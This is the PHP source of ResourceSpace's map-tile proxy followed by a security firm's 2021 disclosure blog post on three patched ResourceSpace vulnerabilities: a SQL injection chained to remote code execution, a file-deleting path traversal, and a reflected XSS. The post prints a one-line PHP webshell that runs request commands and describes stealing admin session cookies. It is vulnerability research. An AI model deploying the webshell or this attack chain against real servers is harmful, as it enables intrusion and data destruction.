=== Content from svn.resourcespace.com_6be7c48a_20250114_183423.html ===
php
include\_once "../../include/db.php";
$provider = getval("provider","");
$variant = getval("variant","");
$provider = safe\_file\_name($provider);
$variant = safe\_file\_name($variant);
# Originally adapted from
# http://wiki.openstreetmap.org/wiki/ProxySimplePHP
# The main benefit is for SSL sites which don't want to be making HTTP calls which result in content warnings
if(isset($geo\_tile\_cache\_directory))
{
$tilecache = $geo\_tile\_cache\_directory;
}
else
{
$tilecache = get\_temp\_dir()."/tiles";
if($provider != "")
{
$tilecache .= "/" . $provider;
}
if($variant != "")
{
$tilecache .= "/" . $variant;
}
if(!is\_dir($tilecache))
{
if(file\_exists($tilecache))
{
unlink($tilecache);
}
mkdir($tilecache,0777,true);
}
}
$ttl = 86400; //cache timeout in seconds
$x = intval(getval('x',0,true));
$y = intval(getval('y',0,true));
$z = intval(getval('z',0,true));
$file = $tilecache."/${z}\_${x}\_$y.png";
$gettile = true;
while(( !is\_file($file)
||
(filemtime($file)<time()-$geo\_tile\_cache\_lifetime)
||
!in\_array(mime\_content\_type($file),array("image/png","image/jpeg"))
)
&&
$gettile
)
{
if($leaflet\_maps\_enable && count($geo\_leaflet\_sources)  0)
{
$geo\_tile\_urls = array();
foreach($geo\_leaflet\_sources as $geo\_leaflet\_source)
{
// If no provider is specified, default to the first one defined
if($provider == "")
{
$provider = $geo\_leaflet\_source["code"];
}
$geo\_tile\_urls[$geo\_leaflet\_source["code"]] = array();
$geo\_tile\_urls[$geo\_leaflet\_source["code"]]["url"] = $geo\_leaflet\_source["url"];
$geo\_tile\_urls[$geo\_leaflet\_source["code"]]["subdomains"] = isset($geo\_leaflet\_source["subdomains"]) ? $geo\_leaflet\_source["subdomains"] : "dd";
$geo\_file\_extension = isset($geo\_leaflet\_source["extension"]) ? $geo\_leaflet\_source["extension"] : "";
$geo\_tile\_urls[$geo\_leaflet\_source["code"]] ["extension"] = $geo\_file\_extension;
foreach($geo\_leaflet\_source["variants"] as $mapvariant=>$varopts)
{
if(isset($varopts["url"]))
{
$varcode = $geo\_leaflet\_source["code"] . "\_" . mb\_strtolower($mapvariant);
$geo\_tile\_urls[$varcode]["url"] = $varopts["url"];
$geo\_tile\_urls[$varcode]["subdomains"] = isset($geo\_leaflet\_source["subdomains"]) ? $geo\_leaflet\_source["subdomains"] : "#";
$geo\_tile\_urls[$varcode]["extension"] = $geo\_file\_extension;
}
}
}
if(($provider != "" && isset($geo\_tile\_urls[$provider])))
{
$url = $geo\_tile\_urls[$provider]["url"];
$subdomains = isset($geo\_tile\_urls[$provider]["subdomains"]) ? $geo\_tile\_urls[$provider]["subdomains"] : "#";
$extension = $geo\_tile\_urls[$provider]["extension"];
if($variant != "" && isset($geo\_tile\_urls[$provider . "\_" . mb\_strtolower($variant)]))
{
$url = $geo\_tile\_urls[$provider . "\_" . mb\_strtolower($variant)]["url"];
$subdomains = $geo\_tile\_urls[$provider . "\_" . mb\_strtolower($variant)]["subdomains"];
}
while(strlen($subdomains) > 0)
{
// Get a random subdomain
$subidx = substr($subdomains,0,1);
//$url = $subdomains[$subidx] . "." . $url;
// Replace placeholders in URL
$find = array("{x}","{y}","{z}","{ext}");
$replace = array($x,$y,$z,$extension);
if($subidx != "#")
{
$find[] = "{s}";
$replace[] = $subidx;
}
$url = str\_replace($find,$replace,$url);
//echo($url);
$ch = curl\_init($url);
curl\_setopt($ch, CURLOPT\_HEADER, true);
curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, true);
curl\_setopt($ch, CURLOPT\_USERAGENT, $geo\_tile\_user\_agent);
curl\_setopt($ch, CURLOPT\_REFERER, $baseurl);
$cresponse = curl\_exec($ch);
$cerror = curl\_getinfo($ch, CURLINFO\_HTTP\_CODE);
$headersize = curl\_getinfo($ch, CURLINFO\_HEADER\_SIZE);
$header = substr($cresponse, 0, $headersize);
$body = substr($cresponse, $headersize);
curl\_close($ch);
//print\_r($cresponse);
if($cerror == 200)
{
debug("Successfully retrieved tile from " . $url);
file\_put\_contents($file,$body);$gettile = false; $gettile = false;
}
else
{
debug("failed to retrieve tile from " . $url . ". Response: " . $cresponse);
}
$gettile = false;
// Remove this subdomain server from the array
$subdomains = substr($subdomains,1);
}
}
}
elseif($gettile && count($geo\_tile\_servers) > 0)
{
while(count($geo\_tile\_servers) > 0)
{
// Try to get an updated tile from a tile server
$rnd = rand(0,count($geo\_tile\_servers)-1);
$url = 'https://'.$geo\_tile\_servers[$rnd];
$url .= "/".$z."/".$x."/".$y.".png";
$ch = curl\_init($url);
curl\_setopt($ch, CURLOPT\_HEADER, true);
curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, true);
$cresponse = curl\_exec($ch);
$cerror = curl\_getinfo($ch, CURLINFO\_HTTP\_CODE);
$headersize = curl\_getinfo($ch, CURLINFO\_HEADER\_SIZE);
$header = substr($cresponse, 0, $headersize);
$body = substr($cresponse, $headersize);
curl\_close($ch);
if($cerror == 200)
{
file\_put\_contents($file,$body);
}
// Remove this tile server from the array
unset($geo\_tile\_servers[$rnd]);
$geo\_tile\_servers = array\_values($geo\_tile\_servers);
continue;
}
}
elseif($z <= 3)
{
// Use included tiles
$file = \_\_DIR\_\_ . "/../../gfx/geotiles/${z}\_${x}\_$y.png";
$gettile = false;
continue;
}
else
{
debug("Request for a map tile at resolution " . $z . " received but no tiles available at this resolution");
$gettile = false;
continue;
}
}
if(!is\_file($file) || !in\_array(mime\_content\_type($file),array("image/png","image/jpeg")))
{
// No tiles available at requested resolution
http\_response\_code(404);
exit($lang["error-geotile-server-error"]);
}
$exp\_gmt = gmdate("D, d M Y H:i:s", time() + $ttl \* 60) ." GMT";
$mod\_gmt = gmdate("D, d M Y H:i:s", filemtime($file)) ." GMT";
header("Expires: " . $exp\_gmt);
header("Last-Modified: " . $mod\_gmt);
header("Cache-Control: public, max-age=" . $ttl \* 60);
header ('Content-Type: image/png');
readfile($file);
exit();


=== Content from www.horizon3.ai_11b3a915_20250114_183424.html ===


[Skip to main content](#brx-content)
[Skip to footer](#brx-footer)
[![Renmoe Library](https://www.horizon3.ai/wp-content/uploads/2024/11/Horizon3ai_Logo_Tagline_Horizontal_RGB-WhiteTxt_NoTag.png)](https://www.horizon3.ai)

* Solutions
  + Security Strategies
  + [→ Effective Security](/effectivesecurity)
  + [→ Splunk Logging](https://www.horizon3.ai/for-splunk/)
  + [→ Purple Team Culture](https://www.horizon3.ai/purple-team-culture/)
  + [→ Vulnerable ≠ Exploitable](https://www.horizon3.ai/vulnerable-not-exploitable/)
  + [NodeZero for Compliance](https://www.horizon3.ai/compliance/)
  + [→ PCI Complinace](https://www.horizon3.ai/compliance/pci-pentesting/)
  + [→ NIS 2 Compliance](https://www.horizon3.ai/compliance/nis-2-compliance/)
  + [The NodeZero™ Platform](https://www.horizon3.ai/nodezero/)
  + [→ Internal Pentesting](https://www.horizon3.ai/nodezero/continuous-internal-pentesting/)
  + [→ External Pentesting](https://www.horizon3.ai/nodezero/external-pentesting/)
  + [→ Kubernetes Pentesting](https://www.horizon3.ai/nodezero/kubernetes-pentesting/)
  + [→ Cloud Pentesting](https://www.horizon3.ai/nodezero/cloud-pentesting/)
  + [→ Rapid Response](https://www.horizon3.ai/nodezero/rapid-response/)
  + [→ NodeZero Insights](https://www.horizon3.ai/nodezero/insights/)
  + [→ AD Password Audit](https://www.horizon3.ai/nodezero/nodezero-ad-password-audit/)
  + [→ Phishing Impact Testing](https://www.horizon3.ai/nodezero/phishing-impact-testing/)
  + [→ NodeZero Tripwires](https://www.horizon3.ai/nodezero/nodezero-tripwires/)
  + [Documentation](https://docs.horizon3.ai/getting_started/)
  + Use Cases
  + [→ Public Sector](https://www.horizon3.ai/use-case/nodezero-in-the-public-sector/)
  + [→ Education](https://www.horizon3.ai/use-case/nodezero-in-education/)
  + [→ Healthcare](https://www.horizon3.ai/use-case/for-healthcare/)
  + [→ Manufacturing](https://www.horizon3.ai/use-case/nodezero-in-manufacturing/)
  + [→ Financial Services](https://www.horizon3.ai/downloads/whitepapers/unlock-proactive-cybersecurity/)
  + [→ Supply Chain](https://www.horizon3.ai/use-case/nodezero-for-supply-chain/)
  + [→ Large Organizations](/who-uses-nodezero#large-org)
  + [→ MSSP and MSP](https://www.horizon3.ai/partners/mssp-msp/)
  + [Who Uses NodeZero?](https://www.horizon3.ai/who-uses-nodezero/)
  + [→ ITOps and SecOps](/who-uses-nodezero#itops)
  + [→ Security Teams](/who-uses-nodezero#security-teams)
  + [→ Pentesters](/who-uses-nodezero#pentesters)
* Partners
  + [MSSPs and MSPs](https://www.horizon3.ai/partners/mssp-msp/)
  + [Partners](https://www.horizon3.ai/partners/)
  + [Become A Partner](https://www.horizon3.ai/partners#become-a-partner-form)
  + [Partner Portal](https://partners.horizon3.ai/)
* Resources
  + [Resource Center](https://www.horizon3.ai/resource-center/)
  + [Attack Research](https://www.horizon3.ai/category/attack-research/)
  + [Blogs](https://www.horizon3.ai/category/intelligence/blogs/)
  + [Customer Stories](https://www.horizon3.ai/category/customer-story/)
  + [Webinar Replays](https://www.horizon3.ai/category/intelligence/webinars/)
  + [Credential Attacks](https://www.horizon3.ai/credentialattacks/)
  + [Log4Shell](https://www.horizon3.ai/log4shell/)
  + [Ransomware Impact](https://www.horizon3.ai/ransomware/)
  + [Glossary](https://www.horizon3.ai/resource-center/glossary/)
  + [The Death of BAS and the Rise of Autonomous Pentesting](https://www.horizon3.ai/intelligence/blogs/the-death-of-bas-and-the-rise-of-autonomous-pentesting/)

    January 13, 2025  |  [Blogs](https://www.horizon3.ai/category/intelligence/blogs/)
  + [Critical Vulnerabilities in SimpleHelp Remote Support Software](https://www.horizon3.ai/attack-research/disclosures/critical-vulnerabilities-in-simplehelp-remote-support-software/)

    January 13, 2025  |  [Attack Blogs](https://www.horizon3.ai/category/attack-research/attack-blogs/), [Disclosures](https://www.horizon3.ai/category/attack-research/disclosures/)
  + [Simplify Compliance with NodeZero: CMMC, DFARS, and NIST 800-171](https://www.horizon3.ai/intelligence/blogs/simplify-compliance-with-nodezero-cmmc-dfars-and-nist-800-171/)

    January 6, 2025  |  [Blogs](https://www.horizon3.ai/category/intelligence/blogs/)
  + [Securing Financial Services: 5 Critical Cybersecurity Advantages of NodeZero](https://www.horizon3.ai/intelligence/infographics/securing-financial-services-5-critical-cybersecurity-advantages-of-nodezero/)

    January 3, 2025  |  [Infographics](https://www.horizon3.ai/category/intelligence/infographics/)
* Company
  + [Our Vision](https://www.horizon3.ai/horizon3-security-vision/)
  + [Meet The Team](https://www.horizon3.ai/about-us/)
  + [Join The Team](https://www.horizon3.ai/join-our-team/)
  + [Awards](https://www.horizon3.ai/category/news/awards/)
  + [Press Releases](https://www.horizon3.ai/category/news/press-release/)
  + [Contact Us](https://www.horizon3.ai/contact-us/)
  + [Upcoming Events](https://www.horizon3.ai/events/)
* [Log In](https://portal.horizon3ai.com/)
* Try NodeZero
  + [Get A Demo](https://www.horizon3.ai/contact-us/schedule-demo/)
  + [Free Trial](https://portal.horizon3ai.com/)

* Solutions
  + Security Strategies
  + [→ Effective Security](/effectivesecurity)
  + [→ Splunk Logging](https://www.horizon3.ai/for-splunk/)
  + [→ Purple Team Culture](https://www.horizon3.ai/purple-team-culture/)
  + [→ Vulnerable ≠ Exploitable](https://www.horizon3.ai/vulnerable-not-exploitable/)
  + [NodeZero for Compliance](https://www.horizon3.ai/compliance/)
  + [→ PCI Complinace](https://www.horizon3.ai/compliance/pci-pentesting/)
  + [→ NIS 2 Compliance](https://www.horizon3.ai/compliance/nis-2-compliance/)
  + [The NodeZero™ Platform](https://www.horizon3.ai/nodezero/)
  + [→ Internal Pentesting](https://www.horizon3.ai/nodezero/continuous-internal-pentesting/)
  + [→ External Pentesting](https://www.horizon3.ai/nodezero/external-pentesting/)
  + [→ Kubernetes Pentesting](https://www.horizon3.ai/nodezero/kubernetes-pentesting/)
  + [→ Cloud Pentesting](https://www.horizon3.ai/nodezero/cloud-pentesting/)
  + [→ Rapid Response](https://www.horizon3.ai/nodezero/rapid-response/)
  + [→ NodeZero Insights](https://www.horizon3.ai/nodezero/insights/)
  + [→ AD Password Audit](https://www.horizon3.ai/nodezero/nodezero-ad-password-audit/)
  + [→ Phishing Impact Testing](https://www.horizon3.ai/nodezero/phishing-impact-testing/)
  + [→ NodeZero Tripwires](https://www.horizon3.ai/nodezero/nodezero-tripwires/)
  + [Documentation](https://docs.horizon3.ai/getting_started/)
  + Use Cases
  + [→ Public Sector](https://www.horizon3.ai/use-case/nodezero-in-the-public-sector/)
  + [→ Education](https://www.horizon3.ai/use-case/nodezero-in-education/)
  + [→ Healthcare](https://www.horizon3.ai/use-case/for-healthcare/)
  + [→ Manufacturing](https://www.horizon3.ai/use-case/nodezero-in-manufacturing/)
  + [→ Financial Services](https://www.horizon3.ai/downloads/whitepapers/unlock-proactive-cybersecurity/)
  + [→ Supply Chain](https://www.horizon3.ai/use-case/nodezero-for-supply-chain/)
  + [→ Large Organizations](/who-uses-nodezero#large-org)
  + [→ MSSP and MSP](https://www.horizon3.ai/partners/mssp-msp/)
  + [Who Uses NodeZero?](https://www.horizon3.ai/who-uses-nodezero/)
  + [→ ITOps and SecOps](/who-uses-nodezero#itops)
  + [→ Security Teams](/who-uses-nodezero#security-teams)
  + [→ Pentesters](/who-uses-nodezero#pentesters)
* Partners
  + [MSSPs and MSPs](https://www.horizon3.ai/partners/mssp-msp/)
  + [Partners](https://www.horizon3.ai/partners/)
  + [Become A Partner](https://www.horizon3.ai/partners#become-a-partner-form)
  + [Partner Portal](https://partners.horizon3.ai/)
* Resources
  + [Resource Center](https://www.horizon3.ai/resource-center/)
  + [Attack Research](https://www.horizon3.ai/category/attack-research/)
  + [Blogs](https://www.horizon3.ai/category/intelligence/blogs/)
  + [Customer Stories](https://www.horizon3.ai/category/customer-story/)
  + [Webinar Replays](https://www.horizon3.ai/category/intelligence/webinars/)
  + [Credential Attacks](https://www.horizon3.ai/credentialattacks/)
  + [Log4Shell](https://www.horizon3.ai/log4shell/)
  + [Ransomware Impact](https://www.horizon3.ai/ransomware/)
  + [Glossary](https://www.horizon3.ai/resource-center/glossary/)
  + [The Death of BAS and the Rise of Autonomous Pentesting](https://www.horizon3.ai/intelligence/blogs/the-death-of-bas-and-the-rise-of-autonomous-pentesting/)

    January 13, 2025  |  [Blogs](https://www.horizon3.ai/category/intelligence/blogs/)
  + [Critical Vulnerabilities in SimpleHelp Remote Support Software](https://www.horizon3.ai/attack-research/disclosures/critical-vulnerabilities-in-simplehelp-remote-support-software/)

    January 13, 2025  |  [Attack Blogs](https://www.horizon3.ai/category/attack-research/attack-blogs/), [Disclosures](https://www.horizon3.ai/category/attack-research/disclosures/)
  + [Simplify Compliance with NodeZero: CMMC, DFARS, and NIST 800-171](https://www.horizon3.ai/intelligence/blogs/simplify-compliance-with-nodezero-cmmc-dfars-and-nist-800-171/)

    January 6, 2025  |  [Blogs](https://www.horizon3.ai/category/intelligence/blogs/)
  + [Securing Financial Services: 5 Critical Cybersecurity Advantages of NodeZero](https://www.horizon3.ai/intelligence/infographics/securing-financial-services-5-critical-cybersecurity-advantages-of-nodezero/)

    January 3, 2025  |  [Infographics](https://www.horizon3.ai/category/intelligence/infographics/)
* Company
  + [Our Vision](https://www.horizon3.ai/horizon3-security-vision/)
  + [Meet The Team](https://www.horizon3.ai/about-us/)
  + [Join The Team](https://www.horizon3.ai/join-our-team/)
  + [Awards](https://www.horizon3.ai/category/news/awards/)
  + [Press Releases](https://www.horizon3.ai/category/news/press-release/)
  + [Contact Us](https://www.horizon3.ai/contact-us/)
  + [Upcoming Events](https://www.horizon3.ai/events/)
* [Log In](https://portal.horizon3ai.com/)
* Try NodeZero
  + [Get A Demo](https://www.horizon3.ai/contact-us/schedule-demo/)
  + [Free Trial](https://portal.horizon3ai.com/)
# Multiple Vulnerabilities in ResourceSpace

Horizon3.ai  |  November 9, 2021  |  [Disclosures](https://www.horizon3.ai/category/attack-research/disclosures/)

A few months ago, while scanning the external attack surface of one of our clients, our autonomous pentesting product NodeZero identified an instance of an application called ResourceSpace exposed to the Internet. [ResourceSpace](https://www.resourcespace.com/ "https://www.resourcespace.com/") is a digital asset management tool that enables users to organize their digital assets. We thought it was interesting that no vulnerabilities had been publicly disclosed against the product since 2015. So we decided to pull down the latest [source code](http://svn.resourcespace.com/svn/rs/trunk/ "http://svn.resourcespace.com/svn/rs/trunk/") to take a closer look.

During our assessment of the ResourceSpace code base, we found three new vulnerabilities that could be exploited by an unauthenticated attacker. The most critical is [CVE-2021-41765](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41765 "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41765"), a pre-auth SQL injection that an attacker can abuse to gain remote code execution (RCE) privileges on the ResourceSpace server. The other two vulnerabilities identified were [CVE-2021-41950](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41950 "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41950"), a path traversal vulnerability that can be used to delete arbitrary files on the file system, and [CVE-2021-41951](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41951 "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41951"), a reflected cross-site scripting (XSS) vulnerability. All three vulnerabilities were promptly patched by the vendor, Montala Limited.

## CVE-2021-41765: Unauthenticated SQLi to RCE Chain

ResourceSpace is an older-generation PHP application in which many of the core functions and libraries used for input sanitization were built from scratch. SQL queries are built using string concatenation, and to prevent SQL injection, certain functions like `escape_check` and `getvalescaped` are used extensively throughout the code base to sanitize input variables. It requires discipline on the part of developers to consistently apply these sanitization functions.

[ResourceSpace 9.5](https://www.resourcespace.com/blog/resourcespace_9_5 "https://www.resourcespace.com/blog/resourcespace_9_5") was released in March 2021, and one of the new features announced as part of that release was “external upload shares.” This feature makes it possible for users without ResourceSpace accounts to upload content to ResourceSpace. To implement this feature, changes were made to the authentication and authorization logic. Those changes inadvertently introduced this vulnerability, specifically we found one instance where an input parameter was not getting sanitized. This is parameter `k` in the file `pages/edit_fields/9_ajax/add_keyword.php`:

![](https://www.horizon3.ai/wp-content/uploads/2021/11/rs-vuln1-code1-1024x347.png)

Parameter `k` represents an authorization key for an external share, and its value is passed to the `check_access_key_collection` function in `include/user_functions.php`. Along with `k`, an identifier for the external share, `upload_collection`, is also passed into the `check_access_key_collection` function. Upon futher inspection, it turns out that the value of `upload_collection` can be passed in from a cookie called `upload_share_active`, and the value of 1 can always be used for this share even if no external shares have been set up by the ResourceSpace admin.

The function `check_access_key_collection` takes in the value of `k` as the `$key` variable and directly sends it to a SQL query, resulting in the SQL injection vulnerability.

![](https://www.horizon3.ai/wp-content/uploads/2021/11/rs-vuln1-code2-1024x575.png)

We used `sqlmap` to confirm the SQL injection in a local test environment. `sqlmap` confirmed the injection as a boolean-based blind SQL injection.

![](https://www.horizon3.ai/wp-content/uploads/2021/11/rs-vuln1-proof-of-sqli-1024x466.png)

### From SQLi to Admin Access

The unauthenticated SQL injection allows an attacker to dump the entire contents of the ResourceSpace database. We found that this data includes users’ session cookies, which are stored in the `session` column in the `user` table. If the admin’s session cookie is in the database, an attacker can abuse the SQL injection to get access as an admin user.

Using `sqlmap` to dump all usernames, password hashes, and session cookies:

![](https://www.horizon3.ai/wp-content/uploads/2021/11/rs-vuln1-getting-admin-session-cookie-1024x519.png)

Once the session cookie was captured we were able to set the stolen session cookie in the web browser to access the ResourceSpace home page:

![](https://www.horizon3.ai/wp-content/uploads/2021/11/rs-vuln1-adding-admin-session-cookie-1024x368.png)

### From Admin Access to RCE

It is very common for admin access to a web application to result in remote code execution privileges on the underlying server. We’ve described this phenomenon in several previous posts:

* [CVE-2021-27927: CSRF to RCE in Zabbix](https://www.horizon3.ai/cve-2021-27927-csrf-to-rce-chain-in-zabbix/ "https://www.horizon3.ai/cve-2021-27927-csrf-to-rce-chain-in-zabbix/")
* [Unauthenticated XSS to Remote Code Execution Chain in Mautic < 3.2.4](https://www.horizon3.ai/unauthenticated-xss-to-remote-code-execution-chain-in-mautic-3-2-4/ "https://www.horizon3.ai/unauthenticated-xss-to-remote-code-execution-chain-in-mautic-3-2-4/")
* [Hack The Box – Jerry](https://www.horizon3.ai/hack-the-box-jerry/ "https://www.horizon3.ai/hack-the-box-jerry/")

In the case of ResourceSpace, we found that an admin could upload a plugin containing arbitrary PHP files to the server, and then execute those PHP files.

![](https://www.horizon3.ai/wp-content/uploads/2021/11/rs-vuln1-plugin-upload-871x1024.png)

The process for creating a plugin is described [here](https://www.resourcespace.com/knowledge-base/developers/modifications-and-writing-your-own-plugin "https://www.resourcespace.com/knowledge-base/developers/modifications-and-writing-your-own-plugin"). A plugin is a `tar.gz` file renamed to have the `.rsp` extension. We dropped in a basic webshell as part of the plugin archive file:

`<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>%`

Then uploaded it to the server and accessed it to dump the contents of the `/etc/passwd` file:

![](https://www.horizon3.ai/wp-content/uploads/2021/11/rs-vuln1-using-plugin-to-get-rce-1024x642.png)

## CVE-2021-41950: Path Traversal Leading to Arbitrary File Deletion

CVE-2021-41950 is a path traversal vulnerability in `pages/ajax/tiles.php`. The vulnerable code is here:

![](https://www.horizon3.ai/wp-content/uploads/2021/11/rs-vuln2-code2-1024x760.png)

The `provider` and `variant` parameters are unsanitized, and they are used to construct a directory path `$tilecache`. If a file already exists at this directory path, it’s deleted. An unauthenticated attacker can therefore manipulate the `provider` and `variant` parameters to arbitrarily delete files as the web server user, including application source code and the ResourceSpace configuration file `config.php`. Deleting `config.php` is particularly concerning because it contains multiple application-specific secret keys, making the installation hard to recover unless it was recently backed up.

Here’s a `curl` command that exploits this vulnerability to delete the `config.php` file:

![](https://www.horizon3.ai/wp-content/uploads/2021/11/rs-vuln2-request-to-delete-file-1024x541.png)

And the resulting denial of service impact:

![](https://www.horizon3.ai/wp-content/uploads/2021/11/rs-vuln2-dos-1024x564.png)

## CVE-2021-41951: Reflected XSS

CVE-2021-41951 is a reflected XSS vulnerability via the `wordpress_user` parameter in the file `plugins/wordpress_sso/pages/index.php`. The value of this parameter is echo’d back to the caller. This appears to be test code left behind in the install.

![](https://www.horizon3.ai/wp-content/uploads/2021/11/rs-vuln3-code1-1024x944.png)

Proving the XSS:

![](https://www.horizon3.ai/wp-content/uploads/2021/11/rs-vuln3-xss-1024x475.png)

To exploit this vulnerability, an attacker would need to convince a ResourceSpace user to click on a crafted link. If successful, an attacker can then run arbitrary code in the victim’s browser.

## Mitigation

All reported vulnerabilities were promptly fixed by the vendor, Montala Limited. In addition to fixing the above vulnerabilities, the vendor also removed the ability for administrators to upload custom plugins through the web interface.

The critical pre-auth SQL injection vulnerability affects ResourceSpace version 9.5 through 9.6.18229. If you are on any of these versions, it is highly recommended that you update to the latest version of ResourceSpace.

The latest version of ResourceSpace as of this writing is 9.7, released on October 29, 2021.

## Timeline

* Sept. 25, 2021: Vulnerabilities disclosed to vendor
* Sept. 27, 2021: All vulnerabilities fixed
* Nov. 9, 2021: Public disclosure

## References

* [CVE-2021-41765](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41765 "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41765")
* [CVE-2021-41950](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41950 "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41950")
* [CVE-2021-41951](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41951 "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41951")
* [ResourceSpace Product Versions](https://www.resourcespace.com/versions "https://www.resourcespace.com/versions")
* [Patched version of pages/edit\_fields/9\_ajax/add\_keyword.php](http://svn.resourcespace.com/svn/rs/releases/9.6/pages/edit_fields/9_ajax/add_keyword.php "http://svn.resourcespace.com/svn/rs/releases/9.6/pages/edit_fields/9_ajax/add_keyword.php")
* [Patched version of pages/ajax/tiles/php](http://svn.resourcespace.com/svn/rs/releases/9.6/pages/ajax/tiles.php "http://svn.resourcespace.com/svn/rs/releases/9.6/pages/ajax/tiles.php")
* [index.php removed from WordPress SSO plugin](http://svn.resourcespace.com/svn/rs/releases/9.6/plugins/wordpress_sso/pages/ "http://svn.resourcespace.com/svn/rs/releases/9.6/plugins/wordpress_sso/pages/")
##### How can NodeZero help you?

Let our experts walk you through a demonstration of NodeZero, so you can see how to put it to work for your company.[Get a Demo](https://www.horizon3.ai/contact-us/schedule-demo/)Share:

[![Renmoe Library](https://www.horizon3.ai/wp-content/uploads/2021/06/h3-white-logo.png)](https://www.horizon3.ai)Contact Us

### Subscribe to Community Updates

###### NodeZero Solution

* [NodeZero Overview](https://www.horizon3.ai/nodezero/)
* [Internal Pentesting](https://www.horizon3.ai/nodezero/continuous-internal-pentesting/)
* [Kubernetes Pentesting](https://www.horizon3.ai/nodezero/kubernetes-pentesting/)
* [External Pentesting](https://www.horizon3.ai/nodezero/external-pentesting/)
* [Cloud Pentesting](https://www.horizon3.ai/nodezero/cloud-pentesting/)
* [NodeZero Insights](https://www.horizon3.ai/nodezero/insights/)
* [Rapid Response](https://www.horizon3.ai/nodezero/rapid-response/)
* [AD Password Audit](https://www.horizon3.ai/nodezero/nodezero-ad-password-audit/)
* [Phishing Impact Testing](https://www.horizon3.ai/nodezero/phishing-impact-testing/)
* [NodeZero Tripwires](https://www.horizon3.ai/nodezero/nodezero-tripwires/)
* [NodeZero Documentation](https://docs.horizon3.ai/getting_started/)
* [Pentesting for Compliance](https://www.horizon3.ai/compliance/)
* [Pentesting for PCI Compliance](https://www.horizon3.ai/compliance/pci-pentesting/)
* [Pentesting for NIS 2 Compliance](https://www.horizon3.ai/compliance/nis-2-compliance/)
###### Resources

* [Blog](https://www.horizon3.ai/category/intelligence/blogs/)
* [Attack Research](https://www.horizon3.ai/category/attack-research/)
* [White Papers](https://www.horizon3.ai/category/downloads/whitepapers/)
* [Fact Sheets](https://www.horizon3.ai/category/downloads/factsheets/)
* [Case Studies](https://www.horizon3.ai/category/customer-story/)
* [Glossary](https://www.horizon3.ai/resource-center/glossary/)
###### Use Cases

* [Education](https://www.horizon3.ai/use-case/nodezero-in-education/)
* [Healthcare](https://www.horizon3.ai/use-case/for-healthcare/)
* [Manufacturing](https://www.horizon3.ai/use-case/nodezero-in-manufacturing/)
* [Public Sector](https://www.horizon3.ai/use-case/nodezero-in-the-public-sector/)
* [Supply Chain](https://www.horizon3.ai/use-case/nodezero-for-supply-chain/)
* [Financial Services](https://www.horizon3.ai/downloads/whitepapers/unlock-proactive-cybersecurity/)
* [Large Organization](/who-uses-nodezero/#large-org/)
* [MSSPs and MSPs](https://www.horizon3.ai/partners/mssp-msp/)
* [DIB Suppliers](https://www.horizon3.ai/nsa-capt-program-for-dib-suppliers/)
* [On AWS Marketplace](https://www.horizon3.ai/horizon3-ai-and-aws/)
###### Roles

* [ITOps and SecOps](/who-uses-nodezero/#itops)
* [Security Teams](/who-uses-nodezero/#security-teams)
* [Consulting Pentester](/who-uses-nodezero/#pentesters)
###### Partners

* MSSPs and MSPs
* [Become a Partner](https://www.horizon3.ai/partners/)
* [Partner Portal](https://partners.horizon3.ai/)
###### Company

* [About Us](https://www.horizon3.ai/about-us/)
* [Careers](https://www.horizon3.ai/join-our-team/)
* [Press](https://www.horizon3.ai/category/news/press-release/)
* [Awards](https://www.horizon3.ai/category/news/awards/)
* [Contact](https://www.horizon3.ai/contact-us/)
* [Upcoming Events](https://www.horizon3.ai/events/)
© 2024 All Rights Reserved.
[Privacy Policy](https://www.horizon3.ai/privacy-policy/)[Support Policy](https://www.horizon3.ai/support-policy/)[Terms of Service](https://www.horizon3.ai/terms-of-service/)[Trust Center](https://trust.horizon3.ai/)


